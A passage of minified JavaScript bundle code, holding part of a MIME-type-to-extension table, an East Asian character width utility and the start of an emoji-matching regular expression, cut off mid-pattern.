okia.radio-presets":["rpss"],"application/vnd.novadigm.edm":["edm"],"application/vnd.novadigm.edx":["edx"],"application/vnd.novadigm.ext":["ext"],"application/vnd.oasis.opendocument.chart":["odc"],"application/vnd.oasis.opendocument.chart-template":["otc"],"application/vnd.oasis.opendocument.database":["odb"],"application/vnd.oasis.opendocument.formula":["odf"],"application/vnd.oasis.opendocument.formula-template":["odft"],"application/vnd.oasis.opendocument.graphics":["odg"],"application/vnd.oasis.opendocument.graphics-template":["otg"],"application/vnd.oasis.opendocument.image":["odi"],"application/vnd.oasis.opendocument.image-template":["oti"],"application/vnd.oasis.opendocument.presentation":["odp"],"application/vnd.oasis.opendocument.presentation-template":["otp"],"application/vnd.oasis.opendocument.spreadsheet":["ods"],"application/vnd.oasis.opendocument.spreadsheet-template":["ots"],"application/vnd.oasis.opendocument.text":["odt"],"application/vnd.oasis.opendocument.text-master":["odm"],"application/vnd.oasis.opendocument.text-template":["ott"],"application/vnd.oasis.opendocument.text-web":["oth"],"application/vnd.olpc-sugar":["xo"],"application/vnd.oma.dd2+xml":["dd2"],"application/vnd.openblox.game+xml":["obgx"],"application/vnd.openofficeorg.extension":["oxt"],"application/vnd.openstreetmap.data+xml":["osm"],"application/vnd.openxmlformats-officedocument.presentationml.presentation":["pptx"],"application/vnd.openxmlformats-officedocument.presentationml.slide":["sldx"],"application/vnd.openxmlformats-officedocument.presentationml.slideshow":["ppsx"],"application/vnd.openxmlformats-officedocument.presentationml.template":["potx"],"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet":["xlsx"],"application/vnd.openxmlformats-officedocument.spreadsheetml.template":["xltx"],"application/vnd.openxmlformats-officedocument.wordprocessingml.document":["docx"],"application/vnd.openxmlformats-officedocument.wordprocessingml.template":["dotx"],"application/vnd.osgeo.mapguide.package":["mgp"],"application/vnd.osgi.dp":["dp"],"application/vnd.osgi.subsystem":["esa"],"application/vnd.palm":["pdb","pqa","oprc"],"application/vnd.pawaafile":["paw"],"application/vnd.pg.format":["str"],"application/vnd.pg.osasli":["ei6"],"application/vnd.picsel":["efif"],"application/vnd.pmi.widget":["wg"],"application/vnd.pocketlearn":["plf"],"application/vnd.powerbuilder6":["pbd"],"application/vnd.previewsystems.box":["box"],"application/vnd.proteus.magazine":["mgz"],"application/vnd.publishare-delta-tree":["qps"],"application/vnd.pvi.ptid1":["ptid"],"application/vnd.quark.quarkxpress":["qxd","qxt","qwd","qwt","qxl","qxb"],"application/vnd.rar":["rar"],"application/vnd.realvnc.bed":["bed"],"application/vnd.recordare.musicxml":["mxl"],"application/vnd.recordare.musicxml+xml":["musicxml"],"application/vnd.rig.cryptonote":["cryptonote"],"application/vnd.rim.cod":["cod"],"application/vnd.rn-realmedia":["rm"],"application/vnd.rn-realmedia-vbr":["rmvb"],"application/vnd.route66.link66+xml":["link66"],"application/vnd.sailingtracker.track":["st"],"application/vnd.seemail":["see"],"application/vnd.sema":["sema"],"application/vnd.semd":["semd"],"application/vnd.semf":["semf"],"application/vnd.shana.informed.formdata":["ifm"],"application/vnd.shana.informed.formtemplate":["itp"],"application/vnd.shana.informed.interchange":["iif"],"application/vnd.shana.informed.package":["ipk"],"application/vnd.simtech-mindmapper":["twd","twds"],"application/vnd.smaf":["mmf"],"application/vnd.smart.teacher":["teacher"],"application/vnd.software602.filler.form+xml":["fo"],"application/vnd.solent.sdkm+xml":["sdkm","sdkd"],"application/vnd.spotfire.dxp":["dxp"],"application/vnd.spotfire.sfs":["sfs"],"application/vnd.stardivision.calc":["sdc"],"application/vnd.stardivision.draw":["sda"],"application/vnd.stardivision.impress":["sdd"],"application/vnd.stardivision.math":["smf"],"application/vnd.stardivision.writer":["sdw","vor"],"application/vnd.stardivision.writer-global":["sgl"],"application/vnd.stepmania.package":["smzip"],"application/vnd.stepmania.stepchart":["sm"],"application/vnd.sun.wadl+xml":["wadl"],"application/vnd.sun.xml.calc":["sxc"],"application/vnd.sun.xml.calc.template":["stc"],"application/vnd.sun.xml.draw":["sxd"],"application/vnd.sun.xml.draw.template":["std"],"application/vnd.sun.xml.impress":["sxi"],"application/vnd.sun.xml.impress.template":["sti"],"application/vnd.sun.xml.math":["sxm"],"application/vnd.sun.xml.writer":["sxw"],"application/vnd.sun.xml.writer.global":["sxg"],"application/vnd.sun.xml.writer.template":["stw"],"application/vnd.sus-calendar":["sus","susp"],"application/vnd.svd":["svd"],"application/vnd.symbian.install":["sis","sisx"],"application/vnd.syncml+xml":["xsm"],"application/vnd.syncml.dm+wbxml":["bdm"],"application/vnd.syncml.dm+xml":["xdm"],"application/vnd.syncml.dmddf+xml":["ddf"],"application/vnd.tao.intent-module-archive":["tao"],"application/vnd.tcpdump.pcap":["pcap","cap","dmp"],"application/vnd.tmobile-livetv":["tmo"],"application/vnd.trid.tpt":["tpt"],"application/vnd.triscape.mxs":["mxs"],"application/vnd.trueapp":["tra"],"application/vnd.ufdl":["ufd","ufdl"],"application/vnd.uiq.theme":["utz"],"application/vnd.umajin":["umj"],"application/vnd.unity":["unityweb"],"application/vnd.uoml+xml":["uoml"],"application/vnd.vcx":["vcx"],"application/vnd.visio":["vsd","vst","vss","vsw"],"application/vnd.visionary":["vis"],"application/vnd.vsf":["vsf"],"application/vnd.wap.wbxml":["wbxml"],"application/vnd.wap.wmlc":["wmlc"],"application/vnd.wap.wmlscriptc":["wmlsc"],"application/vnd.webturbo":["wtb"],"application/vnd.wolfram.player":["nbp"],"application/vnd.wordperfect":["wpd"],"application/vnd.wqd":["wqd"],"application/vnd.wt.stf":["stf"],"application/vnd.xara":["xar"],"application/vnd.xfdl":["xfdl"],"application/vnd.yamaha.hv-dic":["hvd"],"application/vnd.yamaha.hv-script":["hvs"],"application/vnd.yamaha.hv-voice":["hvp"],"application/vnd.yamaha.openscoreformat":["osf"],"application/vnd.yamaha.openscoreformat.osfpvg+xml":["osfpvg"],"application/vnd.yamaha.smaf-audio":["saf"],"application/vnd.yamaha.smaf-phrase":["spf"],"application/vnd.yellowriver-custom-menu":["cmp"],"application/vnd.zul":["zir","zirz"],"application/vnd.zzazz.deck+xml":["zaz"],"application/x-7z-compressed":["7z"],"application/x-abiword":["abw"],"application/x-ace-compressed":["ace"],"application/x-apple-diskimage":["*dmg"],"application/x-arj":["arj"],"application/x-authorware-bin":["aab","x32","u32","vox"],"application/x-authorware-map":["aam"],"application/x-authorware-seg":["aas"],"application/x-bcpio":["bcpio"],"application/x-bdoc":["*bdoc"],"application/x-bittorrent":["torrent"],"application/x-blorb":["blb","blorb"],"application/x-bzip":["bz"],"application/x-bzip2":["bz2","boz"],"application/x-cbr":["cbr","cba","cbt","cbz","cb7"],"application/x-cdlink":["vcd"],"application/x-cfs-compressed":["cfs"],"application/x-chat":["chat"],"application/x-chess-pgn":["pgn"],"application/x-chrome-extension":["crx"],"application/x-cocoa":["cco"],"application/x-conference":["nsc"],"application/x-cpio":["cpio"],"application/x-csh":["csh"],"application/x-debian-package":["*deb","udeb"],"application/x-dgc-compressed":["dgc"],"application/x-director":["dir","dcr","dxr","cst","cct","cxt","w3d","fgd","swa"],"application/x-doom":["wad"],"application/x-dtbncx+xml":["ncx"],"application/x-dtbook+xml":["dtb"],"application/x-dtbresource+xml":["res"],"application/x-dvi":["dvi"],"application/x-envoy":["evy"],"application/x-eva":["eva"],"application/x-font-bdf":["bdf"],"application/x-font-ghostscript":["gsf"],"application/x-font-linux-psf":["psf"],"application/x-font-pcf":["pcf"],"application/x-font-snf":["snf"],"application/x-font-type1":["pfa","pfb","pfm","afm"],"application/x-freearc":["arc"],"application/x-futuresplash":["spl"],"application/x-gca-compressed":["gca"],"application/x-glulx":["ulx"],"application/x-gnumeric":["gnumeric"],"application/x-gramps-xml":["gramps"],"application/x-gtar":["gtar"],"application/x-hdf":["hdf"],"application/x-httpd-php":["php"],"application/x-install-instructions":["install"],"application/x-iso9660-image":["*iso"],"application/x-iwork-keynote-sffkey":["*key"],"application/x-iwork-numbers-sffnumbers":["*numbers"],"application/x-iwork-pages-sffpages":["*pages"],"application/x-java-archive-diff":["jardiff"],"application/x-java-jnlp-file":["jnlp"],"application/x-keepass2":["kdbx"],"application/x-latex":["latex"],"application/x-lua-bytecode":["luac"],"application/x-lzh-compressed":["lzh","lha"],"application/x-makeself":["run"],"application/x-mie":["mie"],"application/x-mobipocket-ebook":["prc","mobi"],"application/x-ms-application":["application"],"application/x-ms-shortcut":["lnk"],"application/x-ms-wmd":["wmd"],"application/x-ms-wmz":["wmz"],"application/x-ms-xbap":["xbap"],"application/x-msaccess":["mdb"],"application/x-msbinder":["obd"],"application/x-mscardfile":["crd"],"application/x-msclip":["clp"],"application/x-msdos-program":["*exe"],"application/x-msdownload":["*exe","*dll","com","bat","*msi"],"application/x-msmediaview":["mvb","m13","m14"],"application/x-msmetafile":["*wmf","*wmz","*emf","emz"],"application/x-msmoney":["mny"],"application/x-mspublisher":["pub"],"application/x-msschedule":["scd"],"application/x-msterminal":["trm"],"application/x-mswrite":["wri"],"application/x-netcdf":["nc","cdf"],"application/x-ns-proxy-autoconfig":["pac"],"application/x-nzb":["nzb"],"application/x-perl":["pl","pm"],"application/x-pilot":["*prc","*pdb"],"application/x-pkcs12":["p12","pfx"],"application/x-pkcs7-certificates":["p7b","spc"],"application/x-pkcs7-certreqresp":["p7r"],"application/x-rar-compressed":["*rar"],"application/x-redhat-package-manager":["rpm"],"application/x-research-info-systems":["ris"],"application/x-sea":["sea"],"application/x-sh":["sh"],"application/x-shar":["shar"],"application/x-shockwave-flash":["swf"],"application/x-silverlight-app":["xap"],"application/x-sql":["sql"],"application/x-stuffit":["sit"],"application/x-stuffitx":["sitx"],"application/x-subrip":["srt"],"application/x-sv4cpio":["sv4cpio"],"application/x-sv4crc":["sv4crc"],"application/x-t3vm-image":["t3"],"application/x-tads":["gam"],"application/x-tar":["tar"],"application/x-tcl":["tcl","tk"],"application/x-tex":["tex"],"application/x-tex-tfm":["tfm"],"application/x-texinfo":["texinfo","texi"],"application/x-tgif":["*obj"],"application/x-ustar":["ustar"],"application/x-virtualbox-hdd":["hdd"],"application/x-virtualbox-ova":["ova"],"application/x-virtualbox-ovf":["ovf"],"application/x-virtualbox-vbox":["vbox"],"application/x-virtualbox-vbox-extpack":["vbox-extpack"],"application/x-virtualbox-vdi":["vdi"],"application/x-virtualbox-vhd":["vhd"],"application/x-virtualbox-vmdk":["vmdk"],"application/x-wais-source":["src"],"application/x-web-app-manifest+json":["webapp"],"application/x-x509-ca-cert":["der","crt","pem"],"application/x-xfig":["fig"],"application/x-xliff+xml":["*xlf"],"application/x-xpinstall":["xpi"],"application/x-xz":["xz"],"application/x-zmachine":["z1","z2","z3","z4","z5","z6","z7","z8"],"audio/vnd.dece.audio":["uva","uvva"],"audio/vnd.digital-winds":["eol"],"audio/vnd.dra":["dra"],"audio/vnd.dts":["dts"],"audio/vnd.dts.hd":["dtshd"],"audio/vnd.lucent.voice":["lvp"],"audio/vnd.ms-playready.media.pya":["pya"],"audio/vnd.nuera.ecelp4800":["ecelp4800"],"audio/vnd.nuera.ecelp7470":["ecelp7470"],"audio/vnd.nuera.ecelp9600":["ecelp9600"],"audio/vnd.rip":["rip"],"audio/x-aac":["aac"],"audio/x-aiff":["aif","aiff","aifc"],"audio/x-caf":["caf"],"audio/x-flac":["flac"],"audio/x-m4a":["*m4a"],"audio/x-matroska":["mka"],"audio/x-mpegurl":["m3u"],"audio/x-ms-wax":["wax"],"audio/x-ms-wma":["wma"],"audio/x-pn-realaudio":["ram","ra"],"audio/x-pn-realaudio-plugin":["rmp"],"audio/x-realaudio":["*ra"],"audio/x-wav":["*wav"],"chemical/x-cdx":["cdx"],"chemical/x-cif":["cif"],"chemical/x-cmdf":["cmdf"],"chemical/x-cml":["cml"],"chemical/x-csml":["csml"],"chemical/x-xyz":["xyz"],"image/prs.btif":["btif"],"image/prs.pti":["pti"],"image/vnd.adobe.photoshop":["psd"],"image/vnd.airzip.accelerator.azv":["azv"],"image/vnd.dece.graphic":["uvi","uvvi","uvg","uvvg"],"image/vnd.djvu":["djvu","djv"],"image/vnd.dvb.subtitle":["*sub"],"image/vnd.dwg":["dwg"],"image/vnd.dxf":["dxf"],"image/vnd.fastbidsheet":["fbs"],"image/vnd.fpx":["fpx"],"image/vnd.fst":["fst"],"image/vnd.fujixerox.edmics-mmr":["mmr"],"image/vnd.fujixerox.edmics-rlc":["rlc"],"image/vnd.microsoft.icon":["ico"],"image/vnd.ms-dds":["dds"],"image/vnd.ms-modi":["mdi"],"image/vnd.ms-photo":["wdp"],"image/vnd.net-fpx":["npx"],"image/vnd.pco.b16":["b16"],"image/vnd.tencent.tap":["tap"],"image/vnd.valve.source.texture":["vtf"],"image/vnd.wap.wbmp":["wbmp"],"image/vnd.xiff":["xif"],"image/vnd.zbrush.pcx":["pcx"],"image/x-3ds":["3ds"],"image/x-cmu-raster":["ras"],"image/x-cmx":["cmx"],"image/x-freehand":["fh","fhc","fh4","fh5","fh7"],"image/x-icon":["*ico"],"image/x-jng":["jng"],"image/x-mrsid-image":["sid"],"image/x-ms-bmp":["*bmp"],"image/x-pcx":["*pcx"],"image/x-pict":["pic","pct"],"image/x-portable-anymap":["pnm"],"image/x-portable-bitmap":["pbm"],"image/x-portable-graymap":["pgm"],"image/x-portable-pixmap":["ppm"],"image/x-rgb":["rgb"],"image/x-tga":["tga"],"image/x-xbitmap":["xbm"],"image/x-xpixmap":["xpm"],"image/x-xwindowdump":["xwd"],"message/vnd.wfa.wsc":["wsc"],"model/vnd.collada+xml":["dae"],"model/vnd.dwf":["dwf"],"model/vnd.gdl":["gdl"],"model/vnd.gtw":["gtw"],"model/vnd.mts":["mts"],"model/vnd.opengex":["ogex"],"model/vnd.parasolid.transmit.binary":["x_b"],"model/vnd.parasolid.transmit.text":["x_t"],"model/vnd.sap.vds":["vds"],"model/vnd.usdz+zip":["usdz"],"model/vnd.valve.source.compiled-map":["bsp"],"model/vnd.vtu":["vtu"],"text/prs.lines.tag":["dsc"],"text/vnd.curl":["curl"],"text/vnd.curl.dcurl":["dcurl"],"text/vnd.curl.mcurl":["mcurl"],"text/vnd.curl.scurl":["scurl"],"text/vnd.dvb.subtitle":["sub"],"text/vnd.fly":["fly"],"text/vnd.fmi.flexstor":["flx"],"text/vnd.graphviz":["gv"],"text/vnd.in3d.3dml":["3dml"],"text/vnd.in3d.spot":["spot"],"text/vnd.sun.j2me.app-descriptor":["jad"],"text/vnd.wap.wml":["wml"],"text/vnd.wap.wmlscript":["wmls"],"text/x-asm":["s","asm"],"text/x-c":["c","cc","cxx","cpp","h","hh","dic"],"text/x-component":["htc"],"text/x-fortran":["f","for","f77","f90"],"text/x-handlebars-template":["hbs"],"text/x-java-source":["java"],"text/x-lua":["lua"],"text/x-markdown":["mkd"],"text/x-nfo":["nfo"],"text/x-opml":["opml"],"text/x-org":["*org"],"text/x-pascal":["p","pas"],"text/x-processing":["pde"],"text/x-sass":["sass"],"text/x-scss":["scss"],"text/x-setext":["etx"],"text/x-sfv":["sfv"],"text/x-suse-ymp":["ymp"],"text/x-uuencode":["uu"],"text/x-vcalendar":["vcs"],"text/x-vcard":["vcf"],"video/vnd.dece.hd":["uvh","uvvh"],"video/vnd.dece.mobile":["uvm","uvvm"],"video/vnd.dece.pd":["uvp","uvvp"],"video/vnd.dece.sd":["uvs","uvvs"],"video/vnd.dece.video":["uvv","uvvv"],"video/vnd.dvb.file":["dvb"],"video/vnd.fvt":["fvt"],"video/vnd.mpegurl":["mxu","m4u"],"video/vnd.ms-playready.media.pyv":["pyv"],"video/vnd.uvvu.mp4":["uvu","uvvu"],"video/vnd.vivo":["viv"],"video/x-f4v":["f4v"],"video/x-fli":["fli"],"video/x-flv":["flv"],"video/x-m4v":["m4v"],"video/x-matroska":["mkv","mk3d","mks"],"video/x-mng":["mng"],"video/x-ms-asf":["asf","asx"],"video/x-ms-vob":["vob"],"video/x-ms-wm":["wm"],"video/x-ms-wmv":["wmv"],"video/x-ms-wmx":["wmx"],"video/x-ms-wvx":["wvx"],"video/x-msvideo":["avi"],"video/x-sgi-movie":["movie"],"video/x-smv":["smv"],"x-conference/x-cooltalk":["ice"]}});var G=de((_c,kn)=>{"use strict";var Cs=xn();kn.exports=new Cs(Cn(),Fn())});var Bn=F(()=>{});var Wn=F(()=>{Bn()});var Tn=de((qc,bt)=>{var re={};typeof bt>"u"?window.eastasianwidth=re:bt.exports=re;re.eastAsianWidth=function(e){var n=e.charCodeAt(0),a=e.length==2?e.charCodeAt(1):0,t=n;return 55296<=n&&n<=56319&&56320<=a&&a<=57343&&(n&=1023,a&=1023,t=n<<10|a,t+=65536),t==12288||65281<=t&&t<=65376||65504<=t&&t<=65510?"F":t==8361||65377<=t&&t<=65470||65474<=t&&t<=65479||65482<=t&&t<=65487||65490<=t&&t<=65495||65498<=t&&t<=65500||65512<=t&&t<=65518?"H":4352<=t&&t<=4447||4515<=t&&t<=4519||4602<=t&&t<=4607||9001<=t&&t<=9002||11904<=t&&t<=11929||11931<=t&&t<=12019||12032<=t&&t<=12245||12272<=t&&t<=12283||12289<=t&&t<=12350||12353<=t&&t<=12438||12441<=t&&t<=12543||12549<=t&&t<=12589||12593<=t&&t<=12686||12688<=t&&t<=12730||12736<=t&&t<=12771||12784<=t&&t<=12830||12832<=t&&t<=12871||12880<=t&&t<=13054||13056<=t&&t<=19903||19968<=t&&t<=42124||42128<=t&&t<=42182||43360<=t&&t<=43388||44032<=t&&t<=55203||55216<=t&&t<=55238||55243<=t&&t<=55291||63744<=t&&t<=64255||65040<=t&&t<=65049||65072<=t&&t<=65106||65108<=t&&t<=65126||65128<=t&&t<=65131||110592<=t&&t<=110593||127488<=t&&t<=127490||127504<=t&&t<=127546||127552<=t&&t<=127560||127568<=t&&t<=127569||131072<=t&&t<=194367||177984<=t&&t<=196605||196608<=t&&t<=262141?"W":32<=t&&t<=126||162<=t&&t<=163||165<=t&&t<=166||t==172||t==175||10214<=t&&t<=10221||10629<=t&&t<=10630?"Na":t==161||t==164||167<=t&&t<=168||t==170||173<=t&&t<=174||176<=t&&t<=180||182<=t&&t<=186||188<=t&&t<=191||t==198||t==208||215<=t&&t<=216||222<=t&&t<=225||t==230||232<=t&&t<=234||236<=t&&t<=237||t==240||242<=t&&t<=243||247<=t&&t<=250||t==252||t==254||t==257||t==273||t==275||t==283||294<=t&&t<=295||t==299||305<=t&&t<=307||t==312||319<=t&&t<=322||t==324||328<=t&&t<=331||t==333||338<=t&&t<=339||358<=t&&t<=359||t==363||t==462||t==464||t==466||t==468||t==470||t==472||t==474||t==476||t==593||t==609||t==708||t==711||713<=t&&t<=715||t==717||t==720||728<=t&&t<=731||t==733||t==735||768<=t&&t<=879||913<=t&&t<=929||931<=t&&t<=937||945<=t&&t<=961||963<=t&&t<=969||t==1025||1040<=t&&t<=1103||t==1105||t==8208||8211<=t&&t<=8214||8216<=t&&t<=8217||8220<=t&&t<=8221||8224<=t&&t<=8226||8228<=t&&t<=8231||t==8240||8242<=t&&t<=8243||t==8245||t==8251||t==8254||t==8308||t==8319||8321<=t&&t<=8324||t==8364||t==8451||t==8453||t==8457||t==8467||t==8470||8481<=t&&t<=8482||t==8486||t==8491||8531<=t&&t<=8532||8539<=t&&t<=8542||8544<=t&&t<=8555||8560<=t&&t<=8569||t==8585||8592<=t&&t<=8601||8632<=t&&t<=8633||t==8658||t==8660||t==8679||t==8704||8706<=t&&t<=8707||8711<=t&&t<=8712||t==8715||t==8719||t==8721||t==8725||t==8730||8733<=t&&t<=8736||t==8739||t==8741||8743<=t&&t<=8748||t==8750||8756<=t&&t<=8759||8764<=t&&t<=8765||t==8776||t==8780||t==8786||8800<=t&&t<=8801||8804<=t&&t<=8807||8810<=t&&t<=8811||8814<=t&&t<=8815||8834<=t&&t<=8835||8838<=t&&t<=8839||t==8853||t==8857||t==8869||t==8895||t==8978||9312<=t&&t<=9449||9451<=t&&t<=9547||9552<=t&&t<=9587||9600<=t&&t<=9615||9618<=t&&t<=9621||9632<=t&&t<=9633||9635<=t&&t<=9641||9650<=t&&t<=9651||9654<=t&&t<=9655||9660<=t&&t<=9661||9664<=t&&t<=9665||9670<=t&&t<=9672||t==9675||9678<=t&&t<=9681||9698<=t&&t<=9701||t==9711||9733<=t&&t<=9734||t==9737||9742<=t&&t<=9743||9748<=t&&t<=9749||t==9756||t==9758||t==9792||t==9794||9824<=t&&t<=9825||9827<=t&&t<=9829||9831<=t&&t<=9834||9836<=t&&t<=9837||t==9839||9886<=t&&t<=9887||9918<=t&&t<=9919||9924<=t&&t<=9933||9935<=t&&t<=9953||t==9955||9960<=t&&t<=9983||t==10045||t==10071||10102<=t&&t<=10111||11093<=t&&t<=11097||12872<=t&&t<=12879||57344<=t&&t<=63743||65024<=t&&t<=65039||t==65533||127232<=t&&t<=127242||127248<=t&&t<=127277||127280<=t&&t<=127337||127344<=t&&t<=127386||917760<=t&&t<=917999||983040<=t&&t<=1048573||1048576<=t&&t<=1114109?"A":"N"};re.characterLength=function(e){var n=this.eastAsianWidth(e);return n=="F"||n=="W"||n=="A"?2:1};function Pn(e){return e.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]|[^\uD800-\uDFFF]/g)||[]}re.length=function(e){for(var n=Pn(e),a=0,t=0;t<n.length;t++)a=a+this.characterLength(n[t]);return a};re.slice=function(e,n,a){textLen=re.length(e),n=n||0,a=a||1,n<0&&(n=textLen+n),a<0&&(a=textLen+a);for(var t="",o=0,s=Pn(e),i=0;i<s.length;i++){var l=s[i],c=re.length(l);if(o>=n-(c==2?1:0))if(o+c<=a)t+=l;else break;o+=c}return t}});var In=de((Kc,zn)=>{"use strict";zn.exports=function(){return/\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67)\uDB40\uDC7F|(?:\uD83E\uDDD1\uD83C\uDFFF\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83E\uDDD1|\uD83D\uDC69\uD83C\uDFFF\u200D\uD83E\uDD1D\u200D(?:\uD83D[\uDC68\uDC69]))(?:\uD83C[\uDFFB-\uDFFE])|(?:\uD83E\uDDD1\uD83C\uDFFE\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83E\uDDD1|\uD83D\uDC69\uD83C\uDFFE\u200D\uD83E\uDD1D\u200D(?:\uD83D[\uDC68\uDC69]))(?:\uD83C[\uDFFB-\uDFFD\uDFFF])|(?:\uD83E\uDDD1\uD83C\uDFFD\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83E\uDDD1|\uD83D\uDC69\uD83C\uDFFD\u200D\uD83E\uDD1D\u200D(?:\uD83D[\uDC68\uDC69]))(?:\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF])|(?:\uD83E\uDDD1\uD83C\uDFFC\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83E\uDDD1|\uD83D\uDC69\uD83C\uDFFC\u200D\uD83E\uDD1D\u200D(?:\uD83D[\uDC68\uDC69]))(?:\uD83C[\uDFFB\uDFFD-\uDFFF])|(?:\uD83E\uDDD1\uD83C\uDFFB\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83E\uDDD1|\uD83D\uDC69\uD83C\uDFFB\u200D\uD83E\uDD1D\u200D(?:\uD83D[\uDC68\uDC69]))(?:\uD83C[\uDFFC-\uDFFF])|\uD83D\uDC68(?:\uD83C\uDFFB(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFF]))|\uD83E\uDD1D\u200D\uD83D\uDC68(?:\uD83C[\uDFFC-\uDFFF])|[\u2695\u2696\u2708]\uFE0F|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD]))?|(?:\uD83C[\uDFFC-\uDFFF])\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFF]))|\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83D\uDC68|(?:\uD83D[\uDC68\uDC69])\u200D(?:\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67]))|\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFF\u200D(?:\uD83E\uDD1D\u200D\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFE])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFE\u200D(?:\uD83E\uDD1D\u200D\uD83D\uDC68(?:\uD83C[\uDFFB-\uDFFD\uDFFF])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFD\u200D(?:\uD83E\uDD1D\u200D\uD83D\uDC68(?:\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFC\u200D(?:\uD83E\uDD1D\u200D\uD83D\uDC68(?:\uD83C[\uDFFB\uDFFD-\uDFFF])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|(?:\uD83C\uDFFF\u200D[\u2695\u2696\u2708]|\uD83C\uDFFE\u200D[\u2695\u2696\u2708]|\uD83C\uDFFD\u200D[\u2695\u2696\u2708]|\uD83C\uDFFC\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708])\uFE0F|\u200D(?:(?:\uD83D[\uDC68\uDC69])\u200D(?:\uD83D[\uDC66\uDC67])|\uD83D[\uDC66\uDC67])|\uD83C\uDFFF|\uD83C\uDFFE|\uD83C\uDFFD|\uD83C\uDFFC)?|(?:\uD83D\uDC69(?:\uD83C\uDFFB\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69])|(?:\uD83C[\uDFFC-\uDFFF])\u200D\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69]))|\uD83E\uDDD1(?:\uD83C[\uDFFB-\uDFFF])\u200D\uD83E\uDD1D\u200D\uD83E\uDDD1)(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC69\u200D\uD83D\uDC69\u200D(?:\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67]))|\uD83D\uDC69(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69])|\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFF\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFE\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFD\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFC\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFB\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\u